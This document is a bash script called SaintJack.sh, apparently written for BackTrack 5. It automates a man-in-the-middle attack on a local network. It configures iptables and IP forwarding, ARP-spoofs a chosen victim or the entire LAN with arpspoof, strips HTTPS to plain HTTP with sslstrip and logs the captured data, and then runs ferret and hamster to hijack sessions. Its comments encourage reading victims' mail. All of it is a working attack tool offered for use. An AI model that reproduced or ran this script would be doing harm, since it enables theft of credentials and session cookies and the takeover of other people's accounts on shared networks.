#!/usr/bin/env bash
###################################################################
#initalize some default variables
default_gw="blank" #the  gateway in the LAN
target_ip="//" #the machine you want to attack (default is // (all the machines in the LAN))
interface="eth0" #the NIC interface to use in sniffing packets(your NIC card)
log_file="~/sslstrip.log" #defaut text file to store ssl data 
#Capture crtl-c and it will kill aproceed to clean up any process left 
trap cleanup INT
#--------------------------END OF INITIALIZATION----------------------#
#++++++++++++++++++++++++++++++++FUNCTIONS----------------------------#
#banner function
function banner ()
{
clear
echo -e "\t#############################################################"
echo -e "\t######**++++SaintJack.sh ver. 1.0 for BT5++++++++++**########"
echo -e "\t#___________________________________________________________#"
}
#usage function
function usage()
{
echo -e "\tUsage: ./SaintJack.sh <options>"
echo -e "\t\t-i   interface    :Your network interface card(default=eth0)"
echo -e "\t\t-g   gateway ip   :This is the ip of the gateway(must be given!)"
echo -e "\t\t-t   target ip    :ip address of your target(victim) "
echo -e "\t(NB:if not give it defaults to // meaning all machines in the LAN)"
echo -e "\t\t-w   outfile      :Your sslstrip log file(default=~/sslstrip.log)"
echo -e "\t\t-h                :When used Simply displays this menu ;)"
echo ""
exit 1
}
#end of usage function
#end of banner_function  
#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#
#clean_up function
function cleanup ()
{
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain 
	echo "0" > /proc/sys/net/ipv4/ip_forward
        killall -9 arpspoof sslstrip ferret hamster
}
#end of cleanup
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#
#firewall_setup function ("fully" commented)
function firewall_setup()
{
#make sure that the interface is up first
ifconfig $interface > /dev/null
#enable IP forwarding on your local machine
echo 1 > /proc/sys/net/ipv4/ip_forward
#flush previous iptables rules (not that necessary)
iptables --flush
iptables --table nat --flush
#use ipables to manipulate the packets 
#forward the packets to the internet through a given interface
iptables --table nat -A POSTROUTING --out-interface $interface -j MASQUERADE
#accept incoming packets through a given interface 
iptables  -A FORWARD --in-interface $interface -j ACCEPT
#now redirect all  in comming packets  ment for http protocal port 80 pass throgh th ssl strip proxy on local port 10000
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
}
#end of firewall_setup function
#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#
#browse function
#this will simply launch mozilla firefox and notify the user to change the proxy
#settings to start enjoying the fruits of "his/her" labour
function browse()
{
#start firefox
firefox hamster &
echo -e "\t#############################################################"
echo -e "\t#=====Now all done firefox should be up in few seconds======#"
echo -e "\t#----- ++Simply use the following setting in firefox++------#"
echo -e "\t\thttp:proxy=127.0.0.1"
echo -e "\t\tproxy port=1234"
echo -e "\t *NB.learn to make use of the refresh button it does help ;)*"
echo -e "\t#############################################################"
echo "NB:When you are done just copy 'n' paste this line in your terminal!" 
echo -e "\t\"killall -9 arpspoof sslstrip hamster ferret \""
exit 0
}
#end of browse function
#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#
#main_function
#this function will gather input from the user
#assign them to the variables and run each function if need be
################################################################################
#++#######-------------------MAIN ENTRANCE---------------------------########++#
#______________________________________________________________________________#
#print the banner first
banner
while getopts ":g:i:t:w:h:" options; do
  case $options in
    g ) default_gw=$OPTARG;;
    i ) interface=$OPTARG;;
    t ) target_ip=$OPTARG;;
    w ) log_file=$OPTARG;;
    * ) usage;;
    h ) usage;;
  esac
done 
if [ $default_gw = blank ]; then
   echo -e "\t\033[1;32mError:Default gateway must be given!\033[1;37m"
   usage
else
#notify the user of the settings
   echo -e "\t\033[1;32m+++++Your Settings+++++++\033[1;37m"
   echo -e "\033[1;32mDefault gateway=$default_gw\033[1;37m"
   echo -e "\033[1;32mNetwork interface=$interface\033[1;37m"
   echo -e "\033[1;32mTarget IP=$target_ip\033[1;37m"
   echo -e "\033[1;32msslstrip log=$log_file\033[1;37m"
#start up the attack
   echo -e "\t\033[1;32m++++SaintJack Started++++\033[1;37m"
   echo -e "\033[1;32m[1]Editing iptable to suit the current enviroment......\033[1;37m"
#call firewall_setup function
firewall_setup
sleep 3
echo "Done!"
echo -e "\033[1;32m[2]Getting in the middle (using arpspoof);)..........\033[1;37m"
#do an ARP spoof to polute the LAN(get between your target and the gateway)
xterm -title "A monkey in the middle" -bg black -bd red3 -fg green3 -e  "arpspoof -i $interface -t $default_gw $target_ip" &
sleep 3
echo "Done!"
echo -e "\033[1;32m[3]Striping ssl to plain txt!http as well(using sslstrip);)..........\033[1;37m"
#use sslstrip to strip ssl/http/etc data and store the findes in logfile
xterm -title "Striping SSL" -bg black -bd red3 -fg green3 -e "sslstrip -k -f -a -w $log_file" &
sleep 3
echo "Done!"
echo -e "\033[1;32m[4]Running ferret the sniffer on $interface..........\033[1;37m"
#start the two twins ferret the sniffer,
xterm -title "Mr. ferret" -bg black -bd red3 -fg green3 -e "ferret -i $interface" &
sleep 3
echo "Done!"
#start hamster the proxy
echo -e "\033[1;32m[5]finaly setting up ferret twin sister hamster;)..........\033[1;37m"
xterm -title "I am ferret the proxy" -bg black -bd red3 -fg green3 -e "hamster" &
sleep 3
echo "Done!"
 #if every thing went O.K then all should be well so we start the juicy part read them mails and walls
#start the browse function
browse  
fi

#END
